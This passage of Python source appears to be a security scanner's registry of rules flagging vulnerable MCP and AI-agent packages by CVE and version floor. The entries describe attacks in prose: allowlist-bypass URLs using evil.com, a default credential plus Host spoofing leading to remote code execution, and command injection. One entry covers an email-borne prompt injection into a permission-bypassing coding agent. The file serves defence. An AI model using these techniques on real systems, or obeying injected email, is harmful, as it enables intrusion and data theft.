        ".mcp.json, mcp.json, claude_desktop_config.json and the package-lock.json, "
        "pnpm-lock.yaml and yarn.lock lockfiles, taking the lowest version a range "
        "allows and reporting a reference that states no version. The PyPI project "
        "`openclaw`, an unrelated installer for the cmdop CLI, is a different "
        "package and is not read. The dependency is not read when it is declared in "
        "a sub-directory manifest (`packages/app/package.json`) or in a lockfile "
        "format the reader does not parse (a Yarn 2+ `yarn.lock`). A file over 2 MB, "
        "or a lockfile over 32 MiB, is not read."
    ),
)

_r(
    "AAK-MCP-REPOMIX-CVE-2026-49988-001",
    "Repomix MCP server bypasses secret-scan file-read boundary (< 1.14.1)",
    "Repomix before 1.14.1 lets the MCP server's `attach_packed_output` / "
    "`read_repomix_output` flow register and read arbitrary local `.json` / `.txt` "
    "/ `.md` / `.xml` files without the `file_system_read_file` `runSecretLint()` "
    "safety check or packed-output validation, so MCP callers bypass the local "
    "file-read secret-scanning boundary and can read secrets Repomix would "
    "otherwise redact (CVE-2026-49988). Treat < 1.14.1 (and unpinned) as exposed.",
    Severity.MEDIUM,
    Category.SUPPLY_CHAIN,
    "Upgrade `repomix` to >= 1.14.1 and pin it. Ensure every MCP file-read path "
    "runs the same secret-lint / output-validation checks as the direct read tool.",
    sarif_name="RepomixMcpSecretLintBypass",
    cve_references=["CVE-2026-49988"],
    owasp_mcp_references=["MCP01:2025", "MCP04:2025"],
    owasp_agentic_references=["ASI02", "ASI04"],
    adversa_references=["ADV-DATA-01"],
    limitations=(
        "Reads `repomix` in requirements*.txt at any depth and, at the project root "
        "only, in pyproject.toml, Pipfile, package.json, .mcp.json, mcp.json, "
        "claude_desktop_config.json and the Pipfile.lock, poetry.lock, uv.lock, "
        "package-lock.json, pnpm-lock.yaml and yarn.lock lockfiles, taking the "
        "lowest version a range allows and reporting a reference that states no "
        "version. The dependency is not read when it is declared in a sub-directory "
        "manifest (`packages/app/package.json`), in `.cursor/mcp.json` or "
        "`.vscode/mcp.json`, or in a lockfile format the reader does not parse (a "
        "Yarn 2+ `yarn.lock`). A file over 2 MB, or a lockfile over 32 MiB, is not "
        "read."
    ),
)

_r(
    "AAK-MCP-BETTERAUTH-CVE-2026-53512-001",
    "Better Auth OAuth/MCP plugin flaw cluster — token bypass, code replay, weak crypto, open redirect (< 1.6.13)",
    "Better Auth before 1.6.13 ships a cluster of OAuth flaws reachable through the "
    "`mcp` and legacy `oidcProvider` plugins (and `@better-auth/oauth-provider` from "
    "1.6.0): the `refresh_token` grant authenticates only possession of the "
    "refreshToken row + matching `client_id` and never verifies the confidential "
    "client's `client_secret`, letting an attacker with a refresh token mint "
    "access/refresh tokens (CVE-2026-53512); the `authorization_code` grant redeems a "
    "single-use code via a non-atomic find-then-delete, so two concurrent requests "
    "both mint tokens (code replay, CVE-2026-53518); insecure cryptographic defaults "
    "advertise the `none` algorithm and accept plain PKCE by default (CVE-2026-67336, "
    "fixed 1.6.11); and registered `redirect_uris` are not scheme-validated, so a "
    "`javascript:` redirect URI executes in the authorization-server origin → session "
    "theft / account takeover (CVE-2026-67333, fixed 1.6.13). Treat < 1.6.13 (and "
    "unpinned) as exposed.",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "Upgrade `better-auth` / `@better-auth/oauth-provider` to >= 1.6.13 and pin it. "
    "Verify `client_secret` on confidential-client refresh grants, redeem "
    "authorization codes atomically (single-use, delete-on-read under a lock), reject "
    "non-http(s) `redirect_uri` schemes, and disable the `none` algorithm / plain "
    "PKCE in the OIDC/MCP provider config.",
    sarif_name="BetterAuthOauthTokenEndpointBypass",
    cve_references=["CVE-2026-53512", "CVE-2026-53518", "CVE-2026-67333", "CVE-2026-67336"],
    owasp_mcp_references=["MCP04:2025", "MCP07:2025"],
    owasp_agentic_references=["ASI03", "ASI04"],
    adversa_references=["ADV-AUTH-01"],
    limitations=(
        "Reads `better-auth` and `@better-auth/oauth-provider` in requirements*.txt "
        "at any depth and, at the project root only, in pyproject.toml, Pipfile, "
        "package.json, .mcp.json, mcp.json, claude_desktop_config.json and the "
        "Pipfile.lock, poetry.lock, uv.lock, package-lock.json, pnpm-lock.yaml and "
        "yarn.lock lockfiles, taking the lowest version a range allows and reporting "
        "a reference that states no version. The dependency is not read when it is "
        "declared in a sub-directory manifest (`packages/app/package.json`) or in a "
        "lockfile format the reader does not parse (a Yarn 2+ `yarn.lock`). A file "
        "over 2 MB, or a lockfile over 32 MiB, is not read."
    ),
)

# --- 2026-07-15..17 MCP/agent CVE disclosure wave (pinnable artifacts) -------
# Non-pinnable siblings (Frogman PHP PBX, Claude Code Action / GitHub Action,
# AI Copilot WordPress plugin, ForgeCode with no fixed version, Langflow with no
# NVD version data) are dispositioned in CHANGELOG.cves.md.

_r(
    "AAK-MCP-SDK-CVE-2026-52869-001",
    "MCP Python SDK session/task cross-client access and unbounded request bodies (`mcp` < 1.29.1, and 2.0.x)",
    "The official MCP Python SDK (`mcp` on PyPI) before 1.28.1 has three "
    "session-isolation flaws reachable over its HTTP transports: the SSE and "
    "stateful Streamable HTTP transports route requests by `session_id` / "
    "`Mcp-Session-Id` without verifying the authenticated principal that created "
    "the session, so another bearer-authenticated client with a known session ID "
    "can inject JSON-RPC messages (CVE-2026-52869); the `experimental.enable_tasks()` "
    "default handlers key tasks only by id, letting any client enumerate / read / "
    "cancel other clients' tasks (CVE-2026-52870, from 1.23.0); and the deprecated "
    "`websocket_server` transport accepts handshakes with no Host/Origin validation "
    "(CVE-2026-59950). Before 1.29.1, and on the 2.0 line from 2.0.0a1 to 2.0.1, "
    "the SSE message endpoint, the Streamable HTTP session manager and the OAuth "
    "authorization-server routes also buffer a whole request body with no size "
    "limit, so an unauthenticated client can send a large or streamed body and "
    "exhaust the server's memory (CVE-2026-109527, CVSS 3.1 7.5, CWE-770). Checked "
    "in the source: 0.9.1 and 1.0.0 already read the SSE body whole "
    "(`request.json()`), and 1.29.1 and 2.1.0 add the limit; 2.0.1, released after "
    "2.1.0, does not have it. Stdio-only servers are not exposed to that one.",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "Upgrade `mcp` to 1.29.1 or later, or to 2.1.0 or later on the 2.x line, and pin "
    "it. Bind every session to the principal that created it and validate "
    "Host/Origin on WebSocket handshakes. Until you upgrade, cap the request body "
    "size at a reverse proxy in front of any HTTP transport.",
    sarif_name="McpPythonSdkSessionIsolation",
    cve_references=[
        "CVE-2026-52869",
        "CVE-2026-52870",
        "CVE-2026-59950",
        # Fixed in 1.29.1, above the old 1.28.1 floor, and as severe as the rule,
        # so the floor rose; the 2.0 line is the pin's second range.
        "CVE-2026-109527",
    ],
    owasp_mcp_references=["MCP04:2025", "MCP07:2025", "MCP10:2025"],
    owasp_agentic_references=["ASI03", "ASI04", "ASI08"],
    adversa_references=["ADV-AUTH-11", "ADV-DOS-01"],
    limitations=(
        "Reads `mcp` below 1.29.1, and from 2.0.0 below 2.1.0, in requirements*.txt "
        "at any depth and, at the project root only, in pyproject.toml, Pipfile, "
        ".mcp.json, mcp.json, claude_desktop_config.json and the Pipfile.lock, "
        "poetry.lock and uv.lock lockfiles, taking the lowest version a range "
        "allows. npm's unrelated `mcp` package, in package.json or an npm lockfile, "
        "is not read as the SDK. A reference must state a version to be "
        "reported, so a bare `mcp` is not. It reads versions, not code, so a "
        "stdio-only server, or one behind a body-size limit, is reported too. The "
        "dependency is not read when it is declared in a sub-directory manifest "
        "(`services/api/pyproject.toml`) or in a lockfile format the reader does not "
        "parse (`pdm.lock`). A file over 2 MB, or a lockfile over 32 MiB, is not read."
    ),
)

_r(
    "AAK-MCP-9ROUTER-CVE-2026-46339-001",
    "9Router unauthenticated MCP bridge → command execution (< 0.5.2)",
    "9Router (`9router`) before 0.5.2 exposes MCP routes without authentication "
    "and reaches command execution: `src/proxy.js` did not protect "
    "`/api/cli-tools/*` and `/api/mcp/*`, allowing unauthenticated customPlugin "
    "registration and command execution through the MCP bridge (CVE-2026-46339, "
    "CVSS 10); the `isLocalRequest()` gate trusts spoofable Host/Origin headers "
    "(CVE-2026-49353); and unvalidated MCP plugin args reach `child_process.spawn()` "
    "for RCE via `/api/mcp//sse` (CVE-2026-62312). CVE-2026-63732 (CVSS 9.9) "
    "re-reports the same default-credential (`123456`) + spoofed-Host LOCAL_ONLY "
    "bypass + unvalidated `child_process.spawn()` plugin-registration chain on "
    "0.4.59, also remediated by the 0.5.2 floor. Treat < 0.5.2 (and unpinned) as "
    "exposed.",
    Severity.CRITICAL,
    Category.SUPPLY_CHAIN,
    "Upgrade `9router` to >= 0.5.2 and pin it. Authenticate `/api/mcp/*` and "
    "`/api/cli-tools/*`, do not gate on Host/Origin headers, and validate plugin "
    "args before spawning subprocesses.",
    sarif_name="NineRouterMcpUnauthRce",
    cve_references=["CVE-2026-46339", "CVE-2026-49353", "CVE-2026-62312", "CVE-2026-63732"],
    owasp_mcp_references=["MCP04:2025", "MCP07:2025"],
    owasp_agentic_references=["ASI04", "ASI05"],
    adversa_references=["ADV-AUTH-01"],
    limitations=(
        "Reads `9router` in requirements*.txt at any depth and, at the project root "
        "only, in pyproject.toml, Pipfile, package.json, .mcp.json, mcp.json, "
        "claude_desktop_config.json and the Pipfile.lock, poetry.lock, uv.lock, "
        "package-lock.json, pnpm-lock.yaml and yarn.lock lockfiles, taking the "
        "lowest version a range allows and reporting a reference that states no "
        "version. The dependency is not read when it is declared in a sub-directory "
        "manifest (`packages/app/package.json`), in `.cursor/mcp.json` or "
        "`.vscode/mcp.json`, or in a lockfile format the reader does not parse (a "
        "Yarn 2+ `yarn.lock`). A file over 2 MB, or a lockfile over 32 MiB, is not "
        "read."
    ),
)

_r(
    "AAK-MCP-N8NMCP-CVE-2026-54052-001",
    "n8n-MCP multi-tenant backup isolation bypass (`n8n-mcp` < 2.57.4)",
    "n8n-MCP (`n8n-mcp`) in HTTP multi-tenant mode (`ENABLE_MULTI_TENANT=true`) "
    "does not isolate local workflow version-history backups per tenant: before "
    "2.56.1 an authenticated tenant can read, delete, or destroy other tenants' "
    "workflow snapshots — including node definitions, credential references, and "
    "authorization headers (CVE-2026-54052, CVSS 9.9); before 2.57.4 a tenant can "
    "also reach default-scope `workflow_versions` backups from prior single-tenant "
    "deployments (CVE-2026-55608). Treat < 2.57.4 (and unpinned) as exposed.",
    Severity.CRITICAL,
    Category.SUPPLY_CHAIN,
    "Upgrade `n8n-mcp` to >= 2.57.4 and pin it. Scope every backup read/write to "
    "the authenticated tenant.",
    sarif_name="N8nMcpTenantIsolation",
    cve_references=["CVE-2026-54052", "CVE-2026-55608"],
    owasp_mcp_references=["MCP04:2025", "MCP10:2025"],
    owasp_agentic_references=["ASI03", "ASI04"],
    adversa_references=["ADV-AUTH-01"],
    limitations=(
        "Reads `n8n-mcp` in requirements*.txt at any depth and, at the project root "
        "only, in pyproject.toml, Pipfile, package.json, .mcp.json, mcp.json, "
        "claude_desktop_config.json and the Pipfile.lock, poetry.lock, uv.lock, "
        "package-lock.json, pnpm-lock.yaml and yarn.lock lockfiles, taking the "
        "lowest version a range allows and reporting a reference that states no "
        "version. The dependency is not read when it is declared in a sub-directory "
        "manifest (`packages/app/package.json`), in `.cursor/mcp.json` or "
        "`.vscode/mcp.json`, or in a lockfile format the reader does not parse (a "
        "Yarn 2+ `yarn.lock`). A file over 2 MB, or a lockfile over 32 MiB, is not "
        "read."
    ),
)

_r(
    "AAK-MCP-DBTMCP-CVE-2026-44968-001",
    "dbt-mcp flag injection + tool-arg leakage (`dbt-mcp` < 1.17.1)",
    "`dbt-mcp` before 1.17.1 appends unsanitized `node_selection` / `resource_type` "
    "values to the dbt subprocess argv, letting an MCP client inject dbt global "
    "flags such as `--profiles-dir` / `--project-dir` / `--target` into "
    "`subprocess.Popen` even with `shell=False` (CVE-2026-44968); it also emits "
    "every tool call's full arguments (`sql_query`, `vars`, `node_selection`) "
    "through telemetry (CVE-2026-44970, on by default) and file logging "
    "(CVE-2026-44969) without redaction. Treat < 1.17.1 (and unpinned) as exposed.",
    Severity.MEDIUM,
    Category.SUPPLY_CHAIN,
    "Upgrade `dbt-mcp` to >= 1.17.1 and pin it. Validate `node_selection` / "
    "`resource_type` against an allow-list before adding them to argv, and redact "
    "tool arguments in telemetry / logs.",
    sarif_name="DbtMcpFlagInjection",
    cve_references=[
        "CVE-2026-44968", "CVE-2026-44970", "CVE-2026-44969",
        # 2026-09-14: CVE-2026-55837 (MEDIUM 6.8). The local OAuth helper
        # serves GET /dbt_platform_context with no auth and no Host validation,
        # returning access and refresh tokens to anything that reaches
        # 127.0.0.1:6785, and the missing TrustedHostMiddleware makes it
        # reachable by DNS rebinding from a browser. Fixed 1.20.0, ABOVE this
        # rule's previous 1.17.1 floor, so the floor is raised rather than the
        # CVE merely recorded: 1.17.1 through 1.19.x were vulnerable and silent.
        "CVE-2026-55837",
    ],
    owasp_mcp_references=["MCP01:2025", "MCP04:2025", "MCP05:2025"],
    owasp_agentic_references=["ASI02", "ASI04"],
    adversa_references=["ADV-INJECT-01"],
    limitations=(
        "Reads `dbt-mcp` in requirements*.txt at any depth and, at the project root "
        "only, in pyproject.toml, Pipfile, package.json, .mcp.json, mcp.json, "
        "claude_desktop_config.json and the Pipfile.lock, poetry.lock, uv.lock, "
        "package-lock.json, pnpm-lock.yaml and yarn.lock lockfiles, taking the "
        "lowest version a range allows and reporting a reference that states no "
        "version. The dependency is not read when it is declared in a sub-directory "
        "manifest (`services/api/pyproject.toml`), in `.cursor/mcp.json` or "
        "`.vscode/mcp.json`, or in a lockfile format the reader does not parse "
        "(`pdm.lock`). A file over 2 MB, or a lockfile over 32 MiB, is not read."
    ),
)

_r(
    "AAK-MCP-APIFY-CVE-2026-46341-001",
    "Apify MCP host-validation defects: docs-allowlist SSRF and Actor "
    "path-authority token leak (`@apify/actors-mcp-server` < 0.10.11)",
    "Two defects in the Apify MCP server (`@apify/actors-mcp-server`), both of them "
    "a host check that trusts a string instead of a parsed origin. Before 0.9.21 the "
    "`fetch-apify-docs` allowlist is validated with `String.startsWith()` rather than "
    "hostname comparison, so attacker URLs such as `https://docs.apify.com.evil.com/` "
    "or `https://docs.apify.com@evil.com/` pass the `ALLOWED_DOC_DOMAINS` check and "
    "return arbitrary fetched content to the LLM (CVE-2026-46341, CVSS 6.1, SSRF). "
    "Before 0.10.11 `getActorMCPServerURL` in `src/mcp/actors.ts` concatenates the "
    "trusted Actor standby URL with the Actor-supplied `webServerMcpPath` without "
    "re-checking the resulting origin, so a userinfo-style authority (`@evil.host`) "
    "in a malicious Actor definition redirects `connectMCPClient` to a third-party "
    "host — and the `call-actor`, `fetch-actor-details` and `actor-mcp` paths hand "
    "that URL to transports in `src/mcp/client.ts` that attach the victim's "
    "`Authorization` bearer token, disclosing the Apify API token and with it access "
    "to Actors, stored datasets and billable compute (CVE-2026-50143, CVSS 8.1, "
    "CWE-918). Exploiting the second requires only that the victim invoke or inspect "
    "the attacker-published Actor. The floor is the later of the two: treat "
    "< 0.10.11 (and unpinned) as exposed.",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "Upgrade `@apify/actors-mcp-server` to >= 0.10.11 and pin it. Allow-list by "
    "parsed URL hostname (exact / suffix match), never `startsWith` on the raw URL, "
    "and re-parse any URL built from a partly-untrusted path before attaching "
    "credentials to it — comparing the parsed origin against the expected one is what "
    "catches a userinfo authority that string concatenation does not.",
    sarif_name="ApifyMcpDocsAllowlistSsrf",
    cve_references=["CVE-2026-46341", "CVE-2026-50143"],
    owasp_mcp_references=["MCP01:2025", "MCP04:2025", "MCP05:2025"],
    owasp_agentic_references=["ASI02", "ASI04"],
    adversa_references=["ADV-SSRF-01"],
    limitations=(
        "Reads `@apify/actors-mcp-server` in requirements*.txt at any depth and, at "
        "the project root only, in pyproject.toml, Pipfile, package.json, .mcp.json, "
        "mcp.json, claude_desktop_config.json and the Pipfile.lock, poetry.lock, "
        "uv.lock, package-lock.json, pnpm-lock.yaml and yarn.lock lockfiles, taking "
        "the lowest version a range allows and reporting a reference that states no "
        "version. The dependency is not read when it is declared in a sub-directory "
        "manifest (`packages/app/package.json`), in `.cursor/mcp.json` or "
        "`.vscode/mcp.json`, or in a lockfile format the reader does not parse (a "
        "Yarn 2+ `yarn.lock`). A file over 2 MB, or a lockfile over 32 MiB, is not "
        "read."
    ),
)

_r(
    "AAK-MCP-AGENTICFLOW-CVE-2026-58195-001",
    "Agentic-Flow MCP tool params → execSync command injection (< 2.0.14)",
    "`agentic-flow` before 2.0.14 interpolates attacker-influenceable MCP tool "
    "parameters (`agent`, `task`, `name`, `language`, `agentdb`) directly into "
    "shell command strings passed to `execSync()` across its stdio / FastMCP server "
    "and agent/swarm/hooks tools, allowing arbitrary OS command execution as the "
    "MCP server user (CVE-2026-58195, CVSS 8.8). Treat < 2.0.14 (and unpinned) as "
    "exposed.",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "Upgrade `agentic-flow` to >= 2.0.14 and pin it. Never pass tool parameters "
    "into a shell; use argv-array subprocess calls with validated inputs.",
    sarif_name="AgenticFlowMcpExecSyncInjection",
    cve_references=["CVE-2026-58195"],
    owasp_mcp_references=["MCP04:2025", "MCP05:2025"],
    owasp_agentic_references=["ASI04", "ASI05"],
    adversa_references=["ADV-INJECT-01"],
    limitations=(
        "Reads `agentic-flow` in requirements*.txt at any depth and, at the project "
        "root only, in pyproject.toml, Pipfile, package.json, .mcp.json, mcp.json, "
        "claude_desktop_config.json and the Pipfile.lock, poetry.lock, uv.lock, "
        "package-lock.json, pnpm-lock.yaml and yarn.lock lockfiles, taking the "
        "lowest version a range allows and reporting a reference that states no "
        "version. The dependency is not read when it is declared in a sub-directory "
        "manifest (`packages/app/package.json`), in `.cursor/mcp.json` or "
        "`.vscode/mcp.json`, or in a lockfile format the reader does not parse (a "
        "Yarn 2+ `yarn.lock`). A file over 2 MB, or a lockfile over 32 MiB, is not "
        "read."
    ),
)

_r(
    "AAK-MCP-HEALTHOMICS-CVE-2026-15415-001",
    "AWS HealthOmics MCP workflow-bundle path traversal (< 0.0.36)",
    "The AWS HealthOmics MCP server (`awslabs.aws-healthomics-mcp-server`) before "
    "0.0.36 improperly limits pathnames in its linting tools, so an actor who can "
    "influence the MCP agent can write actor-controlled content outside the "
    "intended workflow-bundle directory via directory-traversal sequences in the "
    "`workflow_files` input (CVE-2026-15415, CVSS 5.5, CWE-22). Treat < 0.0.36 "
    "(and unpinned) as exposed.",
    Severity.MEDIUM,
    Category.SUPPLY_CHAIN,
    "Upgrade `awslabs.aws-healthomics-mcp-server` to >= 0.0.36 and pin it. Resolve "
    "and contain every `workflow_files` path under the bundle root before writing.",
    sarif_name="HealthOmicsMcpPathTraversal",
    cve_references=["CVE-2026-15415"],
    owasp_mcp_references=["MCP04:2025", "MCP05:2025"],
    owasp_agentic_references=["ASI02", "ASI04"],
    adversa_references=["ADV-PATH-01"],
    limitations=(
        "Reads `awslabs.aws-healthomics-mcp-server` in requirements*.txt at any "
        "depth and, at the project root only, in pyproject.toml, Pipfile, "
        "package.json, .mcp.json, mcp.json, claude_desktop_config.json and the "
        "Pipfile.lock, poetry.lock, uv.lock, package-lock.json, pnpm-lock.yaml and "
        "yarn.lock lockfiles, taking the lowest version a range allows and reporting "
        "a reference that states no version. The dependency is not read when it is "
        "declared in a sub-directory manifest (`services/api/pyproject.toml`), in "
        "`.cursor/mcp.json` or `.vscode/mcp.json`, or in a lockfile format the "
        "reader does not parse (`pdm.lock`). A file over 2 MB, or a lockfile over 32 "
        "MiB, is not read."
    ),
)

# ---------------------------------------------------------------------------
# 2026-07-19..20 MCP CVE-response wave (pinnable artifacts). Detector:
# `mcp_cve_pins_2026_07`. Package names + fix floors are the NVD-published
# values. (Two sibling CVEs from the same batch are NOT pins — CVE-2026-53378
# is a Linux-kernel drm/colorop leak, out of AAK's MCP scope; CVE-2026-55544 /
# CVE-2026-55550 are server-side NextCRM MCP-tool authorization bugs in a
# self-hosted app with no pinnable dependency or client-config surface. Both are
# dispositioned in CHANGELOG.cves.md rather than as rules.)
# ---------------------------------------------------------------------------

_r(
    "AAK-MCP-WHATSAPP-CVE-2026-46555-001",
    "whatsapp-mcp < 0.2.1 (unauthenticated loopback bridge + media_path traversal → file exfil)",
    "The WhatsApp MCP Server's `whatsapp-bridge` HTTP API before 0.2.1 listens on "
    "127.0.0.1:8080 with no authentication and no Host-header validation, and its "
    "`/api/send` endpoint accepts an absolute `media_path` with no directory "
    "confinement. Any local process running as the same user — which in an MCP "
    "session includes sibling MCP servers, IDE extensions, and tool-triggered "
    "flows — can send WhatsApp messages from the paired account and read then "
    "exfiltrate arbitrary user-readable files (SSH keys, browser session data, "
    "dotfiles) as document attachments; the missing Host validation also enables "
    "DNS-rebinding from a visited webpage (CVE-2026-46555, CVSS 7.7). Fixed in "
    "0.2.1, which adds required bearer-token auth, a Host allow-list, and "
    "media_path confinement. Treat < 0.2.1 (or unpinned) as exposed.",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "Upgrade whatsapp-mcp to >= 0.2.1 and pin it. Require the bridge bearer token on "
    "all requests, enable Host-header allow-listing, and confine `media_path` to a "
    "configured root (reject absolute paths and `..`). Do not run the bridge next to "
    "untrusted local MCP servers, browser extensions, or other untrusted processes.",
    sarif_name="WhatsAppMcpUnauthBridgeTraversal",
    cve_references=["CVE-2026-46555"],
    owasp_mcp_references=["MCP04:2025", "MCP07:2025"],
    owasp_agentic_references=["ASI02", "ASI04"],
    adversa_references=["ADV-AUTH-01"],
    limitations=(
        "Reads `whatsapp-mcp` in requirements*.txt at any depth and, at the project "
        "root only, in pyproject.toml, Pipfile, package.json, .mcp.json, mcp.json, "
        "claude_desktop_config.json and the Pipfile.lock, poetry.lock, uv.lock, "
        "package-lock.json, pnpm-lock.yaml and yarn.lock lockfiles, taking the "
        "lowest version a range allows and reporting a reference that states no "
        "version. The dependency is not read when it is declared in a sub-directory "
        "manifest (`services/api/pyproject.toml`), in `.cursor/mcp.json` or "
        "`.vscode/mcp.json`, or in a lockfile format the reader does not parse "
        "(`pdm.lock`). A file over 2 MB, or a lockfile over 32 MiB, is not read."
    ),
)

_r(
    "AAK-MCP-AGENTICMAIL-CVE-2026-57495-001",
    "AgenticMail bridge-wake indirect prompt injection (unpinned @agenticmail/* below fix)",
    "AgenticMail gives AI agents real email addresses. In @agenticmail/claudecode "
    "< 0.2.39, @agenticmail/codex < 0.1.33, @agenticmail/core < 0.9.43, and "
    "@agenticmail/openclaw < 0.5.71, two inbound-mail handlers act on a privileged "
    "effect without verifying the sender is the operator (a sibling handler gates "
    "the same untrusted `From` provenance fail-closed with "
    "`isOperatorReplySender`). The high-impact path: any external email routed to "
    "the bridge inbox resumes the operator's Claude Code session with "
    "`permissionMode: 'bypassPermissions'`, embedding the attacker-controlled "
    "`from`/`subject`/`preview` verbatim into the prompt — an indirect prompt "
    "injection into a fully-privileged agent (Bash/Write/Edit/WebFetch + the "
    "agenticmail MCP toolbelt) running as the operator's OAuth identity "
    "(CVE-2026-57495). Fixed in @agenticmail/claudecode 0.2.39, @agenticmail/codex "
    "0.1.33, @agenticmail/core 0.9.43, and @agenticmail/openclaw 0.5.71.",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "Upgrade every @agenticmail/* package to the fixed release and pin it "
    "(@agenticmail/claudecode >= 0.2.39, @agenticmail/codex >= 0.1.33, "
    "@agenticmail/core >= 0.9.43, @agenticmail/openclaw >= 0.5.71). Gate every "
    "privileged inbound-mail effect on operator-sender provenance (fail closed), "
    "and never resume a `bypassPermissions` agent from untrusted `From` mail.",
    sarif_name="AgenticMailBridgeWakeInjection",
    cve_references=["CVE-2026-57495"],
    owasp_mcp_references=["MCP04:2025", "MCP06:2025"],
    owasp_agentic_references=["ASI01", "ASI04"],
    adversa_references=["ADV-AUTH-01"],
    limitations=(
        "Reads `@agenticmail/claudecode`, `@agenticmail/codex`, `@agenticmail/core` "
        "and `@agenticmail/openclaw`, each against its own fix floor, in "
        "requirements*.txt at any depth and, at the project root only, in "
        "pyproject.toml, Pipfile, package.json, .mcp.json, mcp.json, "
        "claude_desktop_config.json and the Pipfile.lock, poetry.lock, uv.lock, "
        "package-lock.json, pnpm-lock.yaml and yarn.lock lockfiles, taking the "
        "lowest version a range allows and reporting a reference that states no "
        "version. The dependency is not read when it is declared in a sub-directory "
        "manifest (`packages/app/package.json`) or in a lockfile format the reader "
        "does not parse (a Yarn 2+ `yarn.lock`). A file over 2 MB, or a lockfile "
        "over 32 MiB, is not read."
    ),
)

# ---------------------------------------------------------------------------
# 2026-07-21 MCP CVE-response wave (pinnable). Detector: mcp_cve_pins_2026_07.
# (Four sibling CVEs from the same batch are NOT new pins — CVE-2026-47394 is
# class-covered by the PraisonAI pin above; CVE-2026-50758 by the next-ai-draw-io
# pin (fires < 0.4.15, catches the affected 0.4.13); CVE-2026-15829 is a Go
# googleapis/mcp-toolbox SQL-injection with no pinnable artifact; CVE-2026-65056
# is an mcp-webresearch SSRF with no published fix version. All dispositioned in
# CHANGELOG.cves.md.)
# ---------------------------------------------------------------------------

_r(
    "AAK-MCP-STATA-CVE-2026-47708-001",
    "stata-mcp < 1.19.0 (Stata command injection, two CVEs)",
    "MCP-for-Stata (PyPI `stata-mcp`) reaches OS command execution twice over, "
    "by the same route: an unsanitized parameter is concatenated into a Stata "
    "command string, and Stata's own `shell` / `python` escapes turn that into "
    "the operating system. CVE-2026-47708 (< 1.17.3) is the `log_file_name` "
    "parameter of `stata_do` — the `GuardValidator` scans only the do-file "
    "content, never the parameter. CVE-2026-55071 (< 1.19.0, CVSS 3.1 8.4, "
    "GHSA-49m4-vp58-wgc9) is the `package` parameter of `ado_package_install`, "
    "which is in the **default** tool profile, so no non-default configuration "
    "is required. The command is handed over as an argv element, which stops "
    "shell metacharacters and does nothing at all about newline injection into "
    "Stata's command language. Fixed in 1.19.0; treat < 1.19.0 (and unpinned) "
    "as exposed.",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "Upgrade `stata-mcp` to >= 1.19.0 and pin it. Allow-list both the "
    "`log_file_name` and `package` parameters (reject quotes, newlines, and "
    "Stata command separators) rather than relying on the do-file content "
    "guard or on argv quoting.",
    sarif_name="McpForStataCommandInjection",
    cve_references=["CVE-2026-47708", "CVE-2026-55071"],
    incident_references=["GHSA-4p62-hqp5-g644", "GHSA-49m4-vp58-wgc9"],
    owasp_mcp_references=["MCP04:2025", "MCP05:2025"],
    owasp_agentic_references=["ASI04", "ASI05"],
    adversa_references=["ADV-AUTH-01"],
    limitations=(
        "Reads `stata-mcp` in requirements*.txt at any depth and, at the project "
        "root only, in pyproject.toml, Pipfile, package.json, .mcp.json, mcp.json, "
        "claude_desktop_config.json and the Pipfile.lock, poetry.lock, uv.lock, "
        "package-lock.json, pnpm-lock.yaml and yarn.lock lockfiles, taking the "
        "lowest version a range allows and reporting a reference that states no "
        "version. The dependency is not read when it is declared in a sub-directory "
        "manifest (`services/api/pyproject.toml`), in `.cursor/mcp.json` or "
        "`.vscode/mcp.json`, or in a lockfile format the reader does not parse "
        "(`pdm.lock`). A file over 2 MB, or a lockfile over 32 MiB, is not read."
    ),
)

# ---------------------------------------------------------------------------
# 2026-07-22 MCP CVE-response wave. Detector: mcp_cve_pins_2026_07.
# (Sibling CVE-2026-44192 — Ansible Lightspeed MCP path traversal / indirect
# prompt injection — is dispositioned in CHANGELOG.cves.md: a Red Hat product
# component with no npm/PyPI artifact and no published fix version, so no pin.)
# ---------------------------------------------------------------------------

_r(
    "AAK-MCP-N8N-CVE-2026-65594-001",
    "n8n MCP Server Trigger OAuth workflow-authorization bypass (2.27.0–<2.29.8, 2.30.0–<2.30.1)",
    "n8n before 2.29.8 (and the 2.30.x line before 2.30.1), affected from 2.27.0 "
    "when the OAuth 2.1 consent / token-issuance flow was introduced, does not "
    "verify that the authenticated user has access to the workflow referenced as "
    "the OAuth resource. On an instance with an active MCP Server Trigger "
    "workflow using n8n OAuth2 auth, a member-level user can register an OAuth "
    "client, self-approve consent for another user's workflow, and obtain a valid "
    "token; the workflow then runs in the owner's project with the owner's stored "
    "credentials, breaking user/project isolation (CVE-2026-65594). This is a "
    "distinct fix line from n8n's earlier 2.27.4 / 2.28.1 MCP auth-bypass pin, so "
    "it has its own rule. Treat 2.27.0–2.29.7 and 2.30.0 as exposed.",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "Upgrade `n8n` to >= 2.29.8 (or >= 2.30.1 on the 2.30.x line) and pin it. "
    "Ensure the MCP Server Trigger OAuth consent/token flow verifies the "
    "authenticated user's access to the referenced workflow before issuing a token.",
    sarif_name="N8nMcpOAuthWorkflowAuthzBypass",
    cve_references=["CVE-2026-65594"],
    owasp_mcp_references=["MCP04:2025", "MCP07:2025"],
    owasp_agentic_references=["ASI03", "ASI04"],
    adversa_references=["ADV-AUTH-01"],
    limitations=(
        "Reads `n8n` in requirements*.txt at any depth and, at the project root "
        "only, in pyproject.toml, Pipfile, package.json, .mcp.json, mcp.json, "
        "claude_desktop_config.json and the Pipfile.lock, poetry.lock, uv.lock, "
        "package-lock.json, pnpm-lock.yaml and yarn.lock lockfiles, reporting a "
        "range that admits an affected version and a reference that states no "
        "version. The dependency is not read when it is declared in a sub-directory "
        "manifest (`packages/app/package.json`) or in a lockfile format the reader "
        "does not parse (a Yarn 2+ `yarn.lock`). A compose file's `n8nio/n8n` image "
        "tag is not read. A file over 2 MB, or a lockfile over 32 MiB, is not read."
    ),
)

# ---------------------------------------------------------------------------
# 2026-07-23..24 MCP CVE-response wave. Detector: mcp_cve_pins_2026_07.
# ---------------------------------------------------------------------------

_r(
    "AAK-MCP-AWSAPIMCP-CVE-2026-16584-001",
    "AWS API MCP Server security-policy bypass on init failure (0.2.13–<1.3.47)",
